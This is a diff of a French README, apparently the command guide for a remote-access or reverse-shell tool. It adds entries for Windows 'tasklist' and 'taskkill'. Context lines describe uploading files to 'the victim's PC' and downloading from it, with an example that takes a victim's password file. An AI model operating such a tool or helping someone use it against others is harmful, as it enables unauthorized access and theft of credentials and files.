@@ -70,6 +70,8 @@ Contact :
 - cd .. && mkdir reverse ||| '&&' Permet d'exécuter une commande puis une autre, exemple 'cd ..' permet d'aller un dossier en arrière puis de créer un dossier.
 - type file.txt ||| Équivalent à 'cat' sur Unix pour voir le contenu d'un fichier texte.
 - echo "salut" >> salut.txt ||| Permet d'écrire "salut" dans un fichier qui va être appelé "salut.txt".
+- tasklist ||| Permet de voir toutes les proccess en cours avec leur nom et leur PID 
+- taskkill /F /PID [PID] ||| Permet de quitter un process via le PID
 
 - upload [Chemin d'accès] ||| Permet d'envoyer un fichier sur le pc de la victime (Exemple: upload C:\Users\Miro\Desktop\token.py)
 - download [Chemin d'accès] ||| Permet de récupérer un fichier du pc de la victime (Exemple: download C:\Users\Victime\Documents\motdepasse.txt)
